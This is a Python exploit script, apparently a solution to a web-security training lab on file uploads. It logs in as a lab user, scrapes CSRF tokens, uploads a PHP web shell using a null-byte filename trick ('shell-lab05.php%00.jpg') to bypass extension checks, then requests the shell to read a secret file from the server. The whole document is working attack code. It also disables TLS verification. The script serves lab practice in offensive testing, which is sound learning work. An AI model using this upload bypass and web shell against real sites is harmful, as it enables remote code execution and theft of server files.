import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_scookie_csrft(url):
    path= "/login"
    r = requests.get(url + path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    s = soup.findAll("input")
    csrf_token = re.search(r"[A-Z,a-z,0-9]{32}", str(s))
    return r.cookies.get_dict()['session'],csrf_token.group(0)

def get_authscookie(url, session_cookie, csrf_token):
    path = "/login"
    cookies = {'session' : session_cookie}
    params = {'csrf' : csrf_token, 'username' : 'wiener', 'password' : 'peter'}
    r = requests.post(url + path, cookies=cookies, data=params, allow_redirects=False, verify=False, proxies=proxies)
    authorized_session_cookie = r.cookies.get_dict()['session']
    return authorized_session_cookie

def get_csrft_for_upload(url, authorized_session_cookie):
    path = "/my-account"
    cookies = {'session' : authorized_session_cookie}
    r = requests.get(url + path, cookies=cookies, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    s = soup.findAll("input")
    csrf_token = re.search(r"[A-Z,a-z,0-9]{32}", str(s))
    return csrf_token.group(0)


def upload_file(url, authorized_session_cookie, csrf_token):
    path = "/my-account/avatar"
    cookies = {'session' : authorized_session_cookie}
    params = {'csrf' : csrf_token , 'user' : 'wiener'}
    files = {'avatar' : ('shell-lab05.php%00.jpg', open(r"C:\Users\acalarco\csec\web-pentest\portswigger-academy\file-upload\shell-lab05.php", "rb"))}
    r = requests.post(url + path, cookies=cookies, data=params, files=files, verify=False, proxies=proxies)
    if r.status_code == 200 and "has been uploaded." in r.text:
        return True
    else:
        return False


def get_secret(url):
    path = "/files/avatars/shell-lab05.php"
    r = requests.get(url + path, verify=False, proxies=proxies)
    return r.text


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("[+] Testing for an upload vulnerability, extension bypass, in the upload function available for logged-in users")
    session_cookie,csrf_token = get_scookie_csrft(url)
    print("[+] Fetching a session cookie and a valid csrf token to login as user wiener...")
    print("[+] Session cookie is {0} and the csrf token is {1}".format(session_cookie, csrf_token))
    authorized_session_cookie = get_authscookie(url, session_cookie, csrf_token)
    csrf_token = get_csrft_for_upload(url, authorized_session_cookie)
    print("[+] Login complete! Authorized session cookie is %s" % authorized_session_cookie)
    print("[+] Uploading now the .php file using the \"Null byte bypass technique\"...\n[+] Passing file to the web server with \"shell-lab05.php%00.jpeg\" as filename")
    if not upload_file(url, authorized_session_cookie, csrf_token):
        print("[-] Upload failed!")
        sys.exit(-1)
    print("[+] Upload complete!")
    secret = get_secret(url)
    print("[+] The content of the file /home/carlos/secret is %s" % secret)



if __name__ == "__main__":
    main()